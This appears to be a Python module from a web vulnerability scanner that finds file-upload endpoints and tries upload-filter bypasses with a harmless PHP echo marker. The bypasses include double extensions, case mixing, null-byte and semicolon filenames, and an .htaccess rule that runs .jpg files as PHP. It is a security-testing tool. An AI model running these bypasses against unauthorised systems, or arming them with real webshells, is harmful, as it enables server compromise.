"""
文件上传漏洞检测器 — 检测上传点 + 尝试绕过 + 验证 webshell.

攻击链:
    1. 发现上传点 (form/input/file API)
    2. 尝试上传各种 webshell 后缀 (.php/.jsp/.asp/.phtml)
    3. 绕过过滤 (双后缀/大小写/Content-Type 篡改/空字节)
    4. 验证上传成功 (访问上传的文件, 看是否执行)

安全: 只上传无害的探测文件 (echo 标记), 不写真实 webshell.
"""

import asyncio
import re
from typing import List, Dict, Optional
from dataclasses import dataclass, field
from ..pocs.poc_manager import POCResult, Severity


@dataclass
class UploadResult:
    """上传测试结果"""
    endpoint: str
    method: str
    field_name: str
    uploaded: bool = False
    url: str = ""           # 上传后的文件 URL
    content_type: str = ""  # 服务器接受的 Content-Type
    bypass_used: str = ""   # 用的绕过策略
    severity: str = "high"


async def check_file_upload(
    target_url: str,
    engine,
    upload_endpoint: Optional[str] = None,
    field_name: str = "file",
    timeout: float = 15.0,
) -> POCResult:
    """
    文件上传漏洞检测.

    Args:
        target_url:       目标站点
        upload_endpoint:  上传接口路径 (None=自动发现)
        field_name:       文件字段名 (file/upload/image)
    """
    from .bridge import create_bridge_burp

    # 无害的探测 payload (PHP echo)
    marker = "aiburp_test_upload_marker"
    payloads = [
        # (后缀, Content-Type, 内容, 绕过策略)
        (".php", "application/x-php", f"<?php echo '{marker}'; ?>", "direct"),
        (".php.jpg", "image/jpeg", f"<?php echo '{marker}'; ?>", "double-extension"),
        (".phtml", "application/x-php", f"<?php echo '{marker}'; ?>", "phtml"),
        (".php5", "application/x-php", f"<?php echo '{marker}'; ?>", "php5"),
        (".PHP", "application/x-php", f"<?php echo '{marker}'; ?>", "case-mix"),
        (".php%00.jpg", "image/jpeg", f"<?php echo '{marker}'; ?>", "null-byte"),
        (".php;", "application/x-php", f"<?php echo '{marker}'; ?>", "semicolon"),
        (".htaccess", "text/plain", "AddType application/x-httpd-php .jpg", "htaccess"),
    ]

    # 自动发现上传点
    if not upload_endpoint:
        discovered = await _find_upload_points(target_url, engine, timeout)
        if not discovered:
            return POCResult(
                poc_id="file-upload",
                name="File Upload Vulnerability",
                vulnerable=False,
                evidence="未找到上传点",
            )
        upload_endpoint = discovered[0]

    def _run_uploads():
        burp = create_bridge_burp(engine, delay=0)
        results = []

        for ext, ct, content, bypass in payloads:
            filename = f"test{ext}"
            # 构造 multipart
            boundary = "----aiburpBoundary12345"
            body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
                f"Content-Type: {ct}\r\n\r\n"
                f"{content}\r\n"
                f"--{boundary}--\r\n"
            )
            try:
                r = burp.post(
                    upload_endpoint,
                    data=body,
                    headers={
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                    },
                )
                # 检查响应是否暗示上传成功
                upload_ok = False
                uploaded_url = ""

                if r.status in (200, 201):
                    # 检查响应里的文件路径
                    for pattern in [r'(https?://[^\s"\'<>]+\.(?:php|jpg|png|gif))',
                                    r'(/(?:uploads?|files?|images?|media)/[^\s"\'<>]+)',
                                    r'"(?:url|path|file|location)":\s*"([^"]+)"']:
                        m = re.search(pattern, r.body)
                        if m:
                            uploaded_url = m.group(1) if m.lastindex else m.group(0)
                            if uploaded_url.startswith("/"):
                                uploaded_url = target_url.rstrip("/") + uploaded_url
                            upload_ok = True
                            break

                    # 如果响应含 filename 回显
                    if filename in r.body:
                        upload_ok = True

                results.append(UploadResult(
                    endpoint=upload_endpoint,
                    method="POST",
                    field_name=field_name,
                    uploaded=upload_ok,
                    url=uploaded_url,
                    content_type=ct,
                    bypass_used=bypass,
                    severity="high" if upload_ok else "info",
                ))

            except Exception:
                pass

        return results

    try:
        results = await asyncio.to_thread(_run_uploads)
    except Exception as e:
        return POCResult(
            poc_id="file-upload", name="File Upload",
            vulnerable=False, evidence=f"error: {e}",
        )

    # 检查是否有上传成功
    successful = [r for r in results if r.uploaded]
    if successful:
        best = successful[0]
        return POCResult(
            poc_id="file-upload",
            name="File Upload Vulnerability",
            vulnerable=True,
            severity=Severity.HIGH,
            evidence=f"上传成功 ({best.bypass_used}): {best.url}",
            details={
                "endpoint": best.endpoint,
                "bypass": best.bypass_used,
                "url": best.url,
                "successful_uploads": len(successful),
            },
        )

    return POCResult(
        poc_id="file-upload",
        name="File Upload Vulnerability",
        vulnerable=False,
        evidence=f"测试了 {len(results)} 种上传方式, 全部被拒",
    )


async def _find_upload_points(url: str, engine, timeout: float) -> List[str]:
    """从 HTML 中发现上传点"""
    from .bridge import create_bridge_burp

    def _find():
        burp = create_bridge_burp(engine, delay=0)
        endpoints = set()
        r = burp.get(url)
        # 找 <input type="file">
        for m in re.finditer(r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>.*?<input[^>]*type=["\']file["\']',
                             r.body, re.I | re.S):
            action = m.group(1)
            if action.startswith("/"):
                action = url.rstrip("/") + action
            elif not action.startswith("http"):
                action = url.rstrip("/") + "/" + action
            endpoints.add(action)
        # 找 /upload /api/upload /file/upload
        for path in ["/upload", "/uploads", "/api/upload", "/api/file/upload",
                     "/file/upload", "/media/upload", "/image/upload"]:
            test_url = url.rstrip("/") + path
            r2 = burp.post(test_url, data="", timeout=5)
            if r2.status in (200, 201, 405, 415):  # 415=Unsupported Media Type (接口存在)
                endpoints.add(test_url)
        return list(endpoints)

    return await asyncio.to_thread(_find)
